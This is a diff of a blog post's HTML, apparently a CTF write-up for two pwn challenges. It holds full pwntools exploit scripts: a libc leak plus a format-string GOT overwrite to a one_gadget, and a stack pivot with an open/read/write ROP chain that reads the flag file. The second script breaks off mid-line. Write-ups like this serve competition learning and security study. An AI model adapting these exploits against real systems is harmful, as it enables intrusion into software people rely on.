@@ -1,496 +1,1004 @@
-
-
-
-
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html lang="en">
+
+
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#FFF">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+    <meta charset="utf-8">
+    <meta name="keywords" content="DASCTF_X_CBCTF_2022九月挑战赛, Hexo">
+    <meta name="description" content="cyberprinter首先通过溢出覆盖’’\x00’，可以泄露libc.然后是一个格式化字符串漏洞修改puts里面的strlen的libc got
+123456789101112131415161718192021222324252627">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
 
-<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
-  <meta http-equiv="Cache-Control" content="no-transform">
-  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+    <title>DASCTF_X_CBCTF_2022九月挑战赛 | Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
 
 
-<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://wscyoulin.github.io/rss.xml" />
-<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://wscyoulin.github.io/atom.xml" />
-<link rel="alternate" type="application/json" title="Hexo" href="http://wscyoulin.github.io/feed.json" />
+    <!-- bg-cover style     -->
 
-<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
 
-<link rel="stylesheet" href="/css/app.css?v=0.2.5">
 
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.0.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
   
-
-<link rel="canonical" href="http://wscyoulin.github.io/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/">
-
-
-
-  <title>
-DASCTF_X_CBCTF_2022九月挑战赛 - cometition |
-youlin = Hexo</title>
-<meta name="generator" content="Hexo 6.0.0"></head>
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div id="loading">
-    <div class="cat">
-      <div class="body"></div>
-      <div class="head">
-        <div class="face"></div>
-      </div>
-      <div class="foot">
-        <div class="tummy-end"></div>
-        <div class="bottom"></div>
-        <div class="legs left"></div>
-        <div class="legs right"></div>
-      </div>
-      <div class="paw">
-        <div class="hands left"></div>
-        <div class="hands right"></div>
-      </div>
-    </div>
-  </div>
-  <div id="container">
-    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="inner">
-        <div id="brand">
-          <div class="pjax">
-          
-  <h1 itemprop="name headline">DASCTF_X_CBCTF_2022九月挑战赛
-  </h1>
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
   
-<div class="meta">
-  <span class="item" title="Created: 2022-09-20 16:27:39">
-    <span class="icon">
-      <i class="ic i-calendar"></i>
-    </span>
-    <span class="text">Posted on</span>
-    <time itemprop="dateCreated datePublished" datetime="2022-09-20T16:27:39+08:00">2022-09-20</time>
-  </span>
-</div>
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
 
 
-          </div>
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
         </div>
-        <nav id="nav">
-  <div class="inner">
-    <div class="toggle">
-      <div class="lines" aria-label="Toggle navigation bar">
-        <span class="line"></span>
-        <span class="line"></span>
-        <span class="line"></span>
-      </div>
     </div>
-    <ul class="menu">
-      <li class="item title"><a href="/" rel="start">youlin</a></li>
-    </ul>
-    <ul class="right">
-      <li class="item theme">
-        <i class="ic i-sun"></i>
-      </li>
-      <li class="item search">
-        <i class="ic i-search"></i>
-      </li>
-    </ul>
-  </div>
-</nav>
 
-      </div>
-      <div id="imgs" class="pjax">
-        <ul>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclh0m9pdj20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipesng5oej20zk0m87d4.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipetv6p75j20zk0m8x6p.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclwuom7cj20zk0m8dvn.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciuv0socj20zk0m8qes.jpg"></li>
-          <li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeu1usa7j20zk0m8b29.jpg"></li>
-        </ul>
-      </div>
-    </header>
-    <div id="waves">
-      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
-        <defs>
-          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
-        </defs>
-        <g class="parallax">
-          <use xlink:href="#gentle-wave" x="48" y="0" />
-          <use xlink:href="#gentle-wave" x="48" y="3" />
-          <use xlink:href="#gentle-wave" x="48" y="5" />
-          <use xlink:href="#gentle-wave" x="48" y="7" />
-        </g>
-      </svg>
-    </div>
-    <main>
-      <div class="inner">
-        <div id="main" class="pjax">
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
           
-  <div class="article wrap">
-    
-<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
-<i class="ic i-home"></i>
-<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
-<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/cometition/" itemprop="item" rel="index" title="In cometition"><span itemprop="name">cometition</span></a>
-<meta itemprop="position" content="1" /></span>
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+    </ul>
 </div>
 
-    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
-  <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/">
 
-  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="image" content="/images/avatar.jpg">
-    <meta itemprop="name" content="youlin">
-    <meta itemprop="description" content=", ">
-  </span>
+        </div>
 
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
+        
+    </nav>
 
-  <div class="body md" itemprop="articleBody">
+</header>
+
     
 
-    <h2 id="cyberprinter"><a href="#cyberprinter" class="headerlink" title="cyberprinter"></a>cyberprinter</h2><p>首先通过溢出覆盖’’\x00’，可以泄露libc.然后是一个格式化字符串漏洞修改puts里面的strlen的libc got</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./cyberprinter&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">onegadget=0xe6aee</span><br><span class="line">ru(&quot;Your name?pls..&quot;)</span><br><span class="line">sl(b&#x27;A&#x27;*0x17)</span><br><span class="line">libcbase=uu64()-0x1edc50</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">onegadget=libcbase+onegadget</span><br><span class="line">abs_got=libcbase+0x1eb0a8</span><br><span class="line">payload=fmtstr_payload(8,&#123;abs_got:onegadget&#125;)</span><br><span class="line">ru(b&quot;But there is sth wrong in it,so you can&#x27;t do sth&quot;)</span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">DASCTF_X_CBCTF_2022九月挑战赛</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/cometition/" class="post-category">
+                                cometition
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2022-09-20
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="cyberprinter"><a href="#cyberprinter" class="headerlink" title="cyberprinter"></a>cyberprinter</h2><p>首先通过溢出覆盖’’\x00’，可以泄露libc.然后是一个格式化字符串漏洞修改puts里面的strlen的libc got</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = "./cyberprinter"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF("./libc.so.6")</span><br><span class="line">libc=ELF("/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so")</span><br><span class="line">ip = '1.14.71.254'</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 'amd64')</span><br><span class="line">#context(log_level = 'debug', os = 'linux', arch = 'i386')</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">onegadget=0xe6aee</span><br><span class="line">ru("Your name?pls..")</span><br><span class="line">sl(b'A'*0x17)</span><br><span class="line">libcbase=uu64()-0x1edc50</span><br><span class="line">print("libcbase:"+hex(libcbase))</span><br><span class="line">onegadget=libcbase+onegadget</span><br><span class="line">abs_got=libcbase+0x1eb0a8</span><br><span class="line">payload=fmtstr_payload(8,{abs_got:onegadget})</span><br><span class="line">ru(b"But there is sth wrong in it,so you can't do sth")</span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></tbody></table></figure>
 
 <h2 id="appetizer"><a href="#appetizer" class="headerlink" title="appetizer"></a>appetizer</h2><p>首先是一个检查，结合ida和调试可以发现是Nameless和两个字节的偏移，所以是发送’AANameless’来跳过check</p>
 <p>之后就是一个很明显的栈迁移，但是注意不能离end开头太近，函数栈帧会因为往end里写数据而被破坏导致崩溃，所以可以使用垃圾数据把函数栈帧往下挪，使其远离end开头</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./appetizer&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(14),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(&quot;Let&#x27;s check your identity&quot;)</span><br><span class="line">#sl(b&quot;sselemaN&quot;)</span><br><span class="line">s(b&#x27;AANameless&#x27;)</span><br><span class="line">#sl(b&#x27;A&#x27;*2+p64(0x7373656c656d614e))</span><br><span class="line">io.recvuntil(&quot;Here you are:&quot;)</span><br><span class="line">gift=iuu64()</span><br><span class="line">print(&quot;gift:&quot;+hex(gift))</span><br><span class="line">base=gift-0x4050</span><br><span class="line">leave_ret=0x00000000000012d8+base</span><br><span class="line">pop_rdi=base+0x00000000000014d3</span><br><span class="line">pop_rsi_r15=0x00000000000014d1+base</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]+base</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]+base</span><br><span class="line">read_plt=elf.plt[&#x27;read&#x27;]+base</span><br><span class="line">main=0x1428+base</span><br><span class="line"></span><br><span class="line">payload=b&#x27;\x00&#x27;*0x60+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">ru(&quot;And pls write your own information on it&quot;)</span><br><span class="line">s(payload)</span><br><span class="line">ru(&quot;Tell me your wish:&quot;)</span><br><span class="line">payload=p64(gift+0x60-8)+p64(leave_ret)</span><br><span class="line">s(payload)</span><br><span class="line">gdb.attach(io,&#x27;b *gift&#x27;)</span><br><span class="line">libcbase=uu64()-libc.sym[&#x27;puts&#x27;]</span><br><span class="line">open_addr=libcbase+libc.sym[&#x27;open&#x27;]</span><br><span class="line">pop_rsi = libcbase + 0x27529</span><br><span class="line">pop_rdx_rbx = libcbase + 0x1626d6</span><br><span class="line">write_addr=libcbase+libc.sym[&#x27;write&#x27;]</span><br><span class="line">read_addr=libcbase+libc.sym[&#x27;read&#x27;]</span><br><span class="line">puts_addr=libcbase+libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">orw=b&#x27;./flag&#x27;.ljust(8,b&#x27;\x00&#x27;)+ b&#x27;\x00&#x27; * 0x70 + p64(pop_rdi) + p64(gift) + p64(pop_rsi) + p64(0) + p64(open_addr)</span><br><span class="line">orw+= p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(gift + 8) + p64(pop_rdx_rbx) + p64(0x30) + p64(0) + p64(read_plt)</span><br><span class="line">orw+=p64(pop_rdi)+p64(1)+p64(write_addr)</span><br><span class="line"></span><br><span class="line">s(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = "./appetizer"</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">#libc = ELF("./libc.so.6")</span><br><span class="line">libc=ELF("/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")</span><br><span class="line">ip = '1.14.71.254'</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = 'debug', os = 'linux', arch = 